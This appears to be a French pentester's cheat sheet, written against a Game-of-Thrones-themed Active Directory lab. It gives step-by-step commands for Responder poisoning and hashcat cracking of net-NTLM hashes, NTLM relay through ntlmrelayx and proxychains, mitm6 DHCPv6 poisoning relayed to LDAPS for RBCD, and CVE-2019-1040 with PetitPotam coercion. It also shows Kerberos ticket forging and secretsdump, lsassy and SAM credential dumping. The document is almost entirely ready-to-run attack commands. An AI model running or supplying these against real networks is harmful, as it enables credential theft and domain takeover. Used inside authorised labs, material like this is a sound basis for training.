# Responder

**Configuration**
```bash
/usr/share/responder/Responder.conf -> /etc/responder/Responder.conf

sudo sed -i 's/Challenge = Random/Challenge = 1122334455667788/g' /usr/share/responder/Responder.conf
```

Répondre aux requêtes LLMNR et NETBIOS pour récupérer les hash netNTLM

```
responder -I eth1
```

Voir les logs et hashs de Responder

```bash
ls -l /usr/share/responder/logs/                                        
-rw-r--r-- 1 root root     0 Aug 26 17:02 Analyzer-Session.log
-rw-r--r-- 1 root root  7865 Sep 19 15:28 Config-Responder.log
-rw-r--r-- 1 root root  3258 Sep 19 15:30 Poisoners-Session.log
-rw-r--r-- 1 root root 13298 Sep 19 15:30 Responder-Session.log
-rw-r--r-- 1 root root   798 Sep 19 15:30 SMB-NTLMv1-SSP-fe80::f45b:ce35:4c5a:5a58.txt
```

Pour supprimer les logs capturés précédemment (message "skipped previously captured hash"), supprimer le fichier `/usr/share/responder/Responder.db`

Créer un fichier responder.hashes avec les hashes trouvés, et les cracker offline

```bash
hashcat -m5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 
```

Si netNTLMv1 : 
- https://shuck.sh/get-shucking.php
- https://lookup.ntlmrain.com/

# NTLM Relay

Générer une liste de cibles avec SMB signing : false

```bash
nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
```

Arrêter les serveurs SMB et HTTP de Responder car on ne veut pas récupérer les hashes directement mais les relayer vers ntlmrelayx -> /usr/share/responder/Responder.conf

```bash
sudo sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
sudo sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf
```

Démarrer Responder pour empoisonner les réponses aux requêtes et les rediriger vers NTLMrelayx qui va host un proxy socks que l'on utilisera par la suite pour réaliser des actions sur les devices sur lesquels une sessions est ouverte.

```bash
ntlmrelayx.py -tf relay.txt -of netntlm -smb2support -socks
sudo responder -I eth1
```

Maintenant on va effectuer des actions à travers le proxy socks hébergé par ntlmrelayx qui maintient la connexion ouverte relayée.

`/etc/proxychains4.conf` :
```
#socks4 127.0.0.1 9050
socks4 127.0.0.1 1080
```

```bash
proxychains secretsdump.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
proxychains smbclient.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
proxychains smbexec.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
```

[Shadow Credentials](ADCS.md#Shadow%20Credentials)
# Mitm6

Si IPv6 n'est pas désactivé sur les machines des utilisateurs, il est possible d'abuser des requêtes (DHCPv6) pour se faire passer pour un serveur DNS (notre machine) résolvant les noms IPv6, afin de se mettre en position de MiTM.

Empoisonne les requêtes DHCPv6 sur le réseau pour se mettre en position de DNS.

```bash
mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
```

Relaye l'authentification NTLM interceptée vers LDAPS pour créer un compte machine avec délégation RBCD.

```bash
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --delegate-access
```

Forge un ticket Kerberos pour un utilisateur ciblé via S4U2Proxy en exploitant une délégation RBCD.

```bash
getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/relayedpccreate$:ttrJB6qsD;B3BSn'
```

Utiliser ce ticket pour récupérer les secrets sur BRAAVOS

```bash
export KRB5CCNAME=/workspace/Administrator.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
nxc smb 192.168.56.23 -k --use-kcache --sam
```

Si on spécifie un loot dir, toutes les informations du LDAP sont automatiquement dumpées

```
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
```

# CVE-2019-1040 - "Drop The MIC"

> Une vulnérabilité dans NTLM qui permet de relayer une authentification SMB vers LDAPS **en supprimant le MIC (Message Integrity Code)**, ce qui normalement est censé empêcher ce type de relai.

Démarrer le relai avec remove mic vers le ldaps de meereen.essos.local.

```bash
ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --delegate-access
```

Lancer l'authentification coercée sur braavos (braavos est un windows server 2016 à jour, donc petitpotam non authentifié ne fonctionnera pas ici)

```bash
python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
```

L'attaque a fonctionné, on peut maintenant exploiter braavos avec RBCD

```bash
getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/AUTBHVFM$:uvEGGJ+$7g3}Bb*'
```

Utiliser ce ticket pour récupérer les secrets sur BRAAVOS

```bash
export KRB5CCNAME=/workspace/Administrator.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
nxc smb 192.168.56.23 -k --use-kcache --sam
```
